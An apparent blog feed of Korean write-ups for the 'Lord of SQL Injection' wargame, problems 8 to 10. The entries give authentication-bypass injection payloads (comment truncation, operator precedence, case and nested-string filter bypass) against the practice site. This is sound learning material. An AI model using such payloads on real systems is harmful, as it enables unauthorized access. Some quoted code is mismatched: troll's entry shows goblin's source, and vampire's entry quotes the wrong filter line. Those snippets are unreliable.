<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>jslee&#39;s blog</title>
  
  <subtitle>Develop, InfoSec &amp; Life</subtitle>
  <link href="/feed.xml" rel="self"/>
  
  <link href="https://www.jslee.me/"/>
  <updated>2019-08-21T14:53:12.356Z</updated>
  <id>https://www.jslee.me/</id>
  
  <author>
    <name>Jaeseok Lee</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.10 Skeleton</title>
    <link href="https://www.jslee.me/2019/08/21/los-write-up-10-skeleton/"/>
    <id>https://www.jslee.me/2019/08/21/los-write-up-10-skeleton/</id>
    <published>2019-08-21T14:35:49.000Z</published>
    <updated>2019-08-21T14:53:12.356Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 10번 skeleton 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>SQL Injection을 통해 필요하지 않은 조건절을 무력화시킬 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>skeleton 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_skeleton where id='guest' and pw='&#123;$_GET[pw]&#125;' and 1=0"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"skeleton"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_skeleton where id='guest' and pw='&#123;$_GET[pw]&#125;' and 1=0"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"skeleton"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>id</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>주석 처리 이용</p><p>MySQL에서는 <code>#</code>, <code>-- -</code>와 같은 주석문자에 이어져 나오는 문자열을 모두 무시한다.</p><p>따라서 입력값으로 <code>&#39; or id=&#39;admin&#39;%23</code>, <code>&#39; or id=&#39;admin&#39;-- -</code> 과 같이 마지막에 주석을 넣은 값을 넣으면 삽입된 문자열까지만 처리하여 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=&apos; or id=&apos;admin&apos;%23</span><br></pre></td></tr></table></figure><p>URL Encoding 후 공백은 %20, #은 %23, ‘는 %27이 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=&apos; or id=&apos;admin&apos;-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_skeleton <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">#' and 1=0</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_skeleton <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">-- -' and 1=0</span></span><br></pre></td></tr></table></figure></li><li><p>논리 연산 우선순위 이용</p><p>MySQL에서 WHERE절의 논리 연산같은 경우 AND연산이 OR연산보다 우선 처리된다.</p><p>따라서 입력값으로 <code>&#39; or id=&#39;admin&#39; or &#39;1&#39;=&#39;1</code> 과 같은 값을 넣으면 <code>id=&#39;guest&#39;</code>인 행의 <code>pw</code>가 빈 문자열이 아닌 경우 논리 연산 후 결국 <code>id=&#39;admin&#39;</code>인 행을 불러오는 SQL문이 되어 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=&apos; or id=&apos;admin&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_skeleton <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span> <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 10번 skeleton 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.9 Vampire</title>
    <link href="https://www.jslee.me/2019/08/20/los-write-up-09-vampire/"/>
    <id>https://www.jslee.me/2019/08/20/los-write-up-09-vampire/</id>
    <published>2019-08-20T10:48:27.000Z</published>
    <updated>2019-08-20T11:08:10.063Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 9번 vampire 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>admin</code>을 빈 문자열로 교체하는 <code>str_replace()</code> 함수를 우회하여 <code>id</code>값으로 <code>admin</code>을 전달할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="MySQL-대소문자-구별"><a href="#MySQL-대소문자-구별" class="headerlink" title="MySQL 대소문자 구별"></a>MySQL 대소문자 구별</h4><ul><li>MySQL은 기본적으로 대소문자 구별을 하지 않는다.</li><li>MySQL의 대소문자 구별에 대한 자세한 내용을 알고 싶다면 다음 링크를 참고하자.</li><li><a href="https://zetawiki.com/wiki/MySQL_%EB%8C%80%EC%86%8C%EB%AC%B8%EC%9E%90_%EA%B5%AC%EB%B3%84" target="_blank" rel="noopener">MySQL 대소문자 구별 - 제타위키</a></li></ul><h4 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace"></a>str_replace</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed str_replace ( mixed $search , mixed $replace , mixed $subject [, int &amp;$count ] )</span><br></pre></td></tr></table></figure><ul><li><code>str_replace</code> 함수는 문자열에서 <strong>대소문자를 구분하여</strong> 문자열 교체를 수행한다.</li><li>반환값은 치환이 완료된 문자열이다.</li><li>php의 <code>str_replace</code> 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.str-replace.php" target="_blank" rel="noopener">PHP: str_replace - Manual</a></li></ul><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>vampire 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $_GET[id] = str_replace(<span class="string">"admin"</span>,<span class="string">""</span>,$_GET[id]);</span><br><span class="line">  $query = <span class="string">"select id from prob_vampire where id='&#123;$_GET[id]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"vampire"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">$_GET[id] = str_replace(<span class="string">"admin"</span>,<span class="string">""</span>,$_GET[id]);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>id</code>를 받고, <code>id</code>에 <code>&#39;</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>id</code>에 <strong>대소문자 구분 하여</strong> <code>admin</code> 이 들어 있으면 빈 문자열로 교체되고 sql문에 삽입된다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_vampire where id='&#123;$_GET[id]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"vampire"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>id</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>대소문자 구분 이용</p><p>PHP의 <code>str_replace</code> 함수 부분을 보면</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><p>치환될 대상 문자열로 <code>&quot;admin&quot;</code> 을 전달하는 것을 알 수 있다.<br><code>str_replace()</code> 함수는 대소문자를 구분하기 때문에, 이런 경우 <code>admin</code> 이라는 문자열만 치환하게 된다.</p><p>그러나 기본적으로 MySQL에서는 대소문자를 구분하지 않는다.<br>따라서 입력값으로 <code>Admin</code>, <code>ADMIN</code> 과 같이 대문자를 섞은 값을 넣으면 <code>str_replace()</code> 함수에서 필터링이 이루어지지 않아 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/vampire_0538b0259b6680c1ca4631a388177ed4.php?id=ADMIN</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_vampire <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'ADMIN'</span></span><br></pre></td></tr></table></figure></li><li><p><code>str_replace</code> 작동 후 완성되는 문자열 이용</p><p>PHP의 str_replace 함수 부분을 보면</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><p>대상 문자열 <code>&quot;admin&quot;</code> 을 빈 문자열로 치환하는 것을 알 수 있다.<br><code>str_replace()</code> 함수는 1회 작동 후 종료되기 때문에, 이런 경우 <code>admin</code> 이라는 문자열이 한 번만 빈 문자열로 치환되게 된다.<br>따라서 입력값으로 <code>adadminmin</code> 과 같이 <code>str_replace</code> 작동 후 <code>admin</code>이 되는 값을 넣으면 <code>admin</code>이 삽입되어 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/vampire_0538b0259b6680c1ca4631a388177ed4.php?id=adadminmin</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_vampire <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'admin'</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 9번 vampire 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.8 Troll</title>
    <link href="https://www.jslee.me/2019/08/19/los-write-up-08-troll/"/>
    <id>https://www.jslee.me/2019/08/19/los-write-up-08-troll/</id>
    <published>2019-08-19T11:21:10.000Z</published>
    <updated>2019-08-20T11:08:10.063Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 8번 troll 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>admin</code>을 필터링하는 <code>ereg()</code> 함수를 우회하여 <code>id</code>값으로 <code>admin</code>을 전달할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a>ereg</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int ereg ( string $pattern , string $string [, <span class="keyword">array</span> &amp;$regs ] )</span><br></pre></td></tr></table></figure><ul><li><code>ereg</code> 함수는 문자열에서 <strong>대소문자를 구분하여</strong> 정규표현식 매치를 수행한다.</li><li>반환값은 매치된 문자열의 길이 또는 <code>FALSE</code> 이다.</li><li>php의 <code>ereg</code> 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.ereg.php" target="_blank" rel="noopener">PHP: ereg - Manual</a></li></ul><h4 id="MySQL-대소문자-구별"><a href="#MySQL-대소문자-구별" class="headerlink" title="MySQL 대소문자 구별"></a>MySQL 대소문자 구별</h4><ul><li>MySQL은 기본적으로 대소문자 구별을 하지 않는다.</li><li>MySQL의 대소문자 구별에 대한 자세한 내용을 알고 싶다면 다음 링크를 참고하자.</li><li><a href="https://zetawiki.com/wiki/MySQL_%EB%8C%80%EC%86%8C%EB%AC%B8%EC%9E%90_%EA%B5%AC%EB%B3%84" target="_blank" rel="noopener">MySQL 대소문자 구별 - 제타위키</a></li></ul><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>goblin 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|\"|\`/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Quotes ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_goblin where id='guest' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"goblin"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|\"|\`/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Quotes ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>no</code>를 받고, <code>no</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>no</code>에 <code>&#39;</code>, <code>&quot;</code>, ` 가 들어 있으면 <code>No Quotes ~_~</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_goblin where id='guest' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"goblin"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>대소문자 구분 이용</p><p>PHP의 <code>ereg()</code> 함수 부분을 보면</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@ereg(<span class="string">"admin"</span>,$_GET[id])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><p>정규 표현식으로 <code>&quot;admin&quot;</code> 을 전달하는 것을 알 수 있다.<br><code>ereg()</code> 함수는 대소문자를 구분하기 때문에, 이런 경우 <code>admin</code> 이라는 문자열만 매치하게 된다.</p><p>그러나 기본적으로 MySQL에서는 대소문자를 구분하지 않는다.<br>따라서 입력값으로 <code>Admin</code>, <code>ADMIN</code> 과 같이 대문자를 섞은 값을 넣으면 <code>ereg()</code> 함수에서 필터링이 이루어지지 않아 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/troll_6d1f080fa30a07dbaf7342285ba0e158.php?id=ADMIN</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_troll <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'ADMIN'</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 8번 troll 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.7 Orge</title>
    <link href="https://www.jslee.me/2019/08/18/los-write-up-07-orge/"/>
    <id>https://www.jslee.me/2019/08/18/los-write-up-07-orge/</id>
    <published>2019-08-17T17:10:31.000Z</published>
    <updated>2019-08-20T11:08:10.063Z</updated>
    
